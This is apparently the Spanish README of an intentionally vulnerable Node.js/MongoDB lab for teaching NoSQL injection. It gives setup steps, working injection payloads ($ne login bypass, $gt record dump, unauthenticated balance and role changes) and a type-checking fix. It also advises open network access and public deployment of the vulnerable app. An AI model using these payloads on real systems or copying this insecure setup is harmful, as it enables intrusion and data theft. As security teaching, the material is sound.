# 🔓 Laboratorio de NoSQL Injection — MongoDB + Node.js

> **ADVERTENCIA**: Este proyecto es intencionalmente vulnerable.
> Úsalo **solo** en entornos controlados para fines educativos.

---

## 📁 Estructura del proyecto

```
vulnerable-api/
├── server.js        ← Backend Express con rutas vulnerables
├── package.json     ← Dependencias
└── README.md        ← Esta guía
```

## 🛠️ Instalación local

### Requisitos
- Node.js 14+
- npm o yarn

### Pasos

1. **Clonar el repositorio:**
   ```bash
   git clone <url-repo>
   cd DB_MONGO
   ```

2. **Instalar dependencias:**
   ```bash
   npm install
   ```

3. **Configurar variables de entorno:**
   - Copiar `.env.example` a `.env`:
     ```bash
     cp .env.example .env
     ```
   - Editar `.env` y agregar:
     ```env
     MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/streamlab?retryWrites=true&w=majority
     JWT_SECRET=streamlab_secret_2026
     PORT=3000
     ```

4. **Iniciar el servidor:**
   ```bash
   npm start
   ```
   El servidor correrá en `http://localhost:3000`

---


1. Ir a **https://www.mongodb.com/atlas** → Create free account
2. Crear un **cluster gratuito** (M0 Free)
3. En **Database Access** → Add new user:
   - Usuario: `admin`
   - Password: (anótala)
   - Role: `Atlas admin`
4. En **Network Access** → Add IP Address → **Allow access from anywhere** (`0.0.0.0/0`)
5. En **Clusters** → Connect → **Connect your application**
6. Copiar la URI que se ve así:
   ```
   mongodb+srv://admin:<password>@cluster0.xxxxx.mongodb.net/vulnerable_db
   ```

---

## 🚀 Paso 2 — Desplegar en Railway.app

1. Ir a **https://railway.app** → Login con GitHub
2. **New Project** → **Deploy from GitHub repo**
   - Sube el proyecto a GitHub
   - Railway desplegará automáticamente
3. En la pestaña **Variables** del proyecto en Railway, agregar:
   ```
   MONGO_URI = mongodb+srv://username:password@cluster.mongodb.net/streamlab?retryWrites=true&w=majority
   JWT_SECRET = streamlab_secret_2026
   NODE_ENV = production
   PORT = 3000
   ```
4. Railway desplegará y te dará una URL como:
   ```
   https://streamlab-production.up.railway.app
   ```

---

## 📝 Variables de Entorno (Environment Variables)

El proyecto usa las siguientes variables de entorno (configurables en `.env` o en el panel de Railway):

| Variable | Descripción | Ejemplo |
|----------|-----------|---------|
| `MONGO_URI` | MongoDB Atlas connection string | `mongodb+srv://user:pass@cluster.mongodb.net/streamlab?retryWrites=true&w=majority` |
| `JWT_SECRET` | Secret para tokens JWT | `streamlab_secret_2026` |
| `NODE_ENV` | Entorno (development/production) | `production` |
| `PORT` | Puerto del servidor | `3000` |

**Nota:** El archivo `.env` **NO** se sube a GitHub (está en `.gitignore`). Los valores se deben configurar en el servicio de hosting.

---

## 🚀 Paso 3 — Ejecutar los ataques

Puedes usar **Postman**, **curl**, o cualquier cliente HTTP.

---

### 🔴 ATAQUE 1 — Bypass de Login (acceder sin contraseña)

**Request normal (falla):**
```http
POST /login
Content-Type: application/json

{
  "username": "admin",
  "password": "noSeLaContraseña"
}
```
**Resultado:** ❌ LOGIN FALLIDO

---

**Request CON INYECCIÓN (exitoso):**
```http
POST /login
Content-Type: application/json

{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```
**Resultado:** ✅ LOGIN EXITOSO — Accedes como admin sin conocer la contraseña

**¿Por qué funciona?**
MongoDB interpreta `{ "$ne": null }` como "donde username NO ES null", lo que devuelve el primer usuario que encuentra (admin).

---

### 🔴 ATAQUE 2 — Dump de todos los registros

```http
POST /buscar-usuario
Content-Type: application/json

{
  "username": { "$gt": "" }
}
```
**Resultado:** ✅ Retorna TODOS los usuarios con sus contraseñas, emails y balances

**¿Por qué funciona?**
`{ "$gt": "" }` significa "username mayor que cadena vacía" → todos los documentos.

---

### 🔴 ATAQUE 3 — Modificar un valor en la BD

**Cambiar el balance de "juan" a 999999:**
```http
POST /actualizar
Content-Type: application/json

{
  "username": "juan",
  "campo": "balance",
  "valor": 999999
}
```
**Resultado:** ✅ El balance de juan se modificó sin ninguna autenticación

**También puedes cambiar el rol:**
```http
POST /actualizar
Content-Type: application/json

{
  "username": "juan",
  "campo": "role",
  "valor": "admin"
}
```

---

## 🛡️ ¿Cómo se previene?

En código seguro, siempre se valida que el input sea string:

```javascript
// ✅ VERSIÓN SEGURA
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  
  // Validar que sean strings (previene objetos con operadores MongoDB)
  if (typeof username !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "Datos inválidos" });
  }
  
  const user = await User.findOne({ username, password });
  // ...
});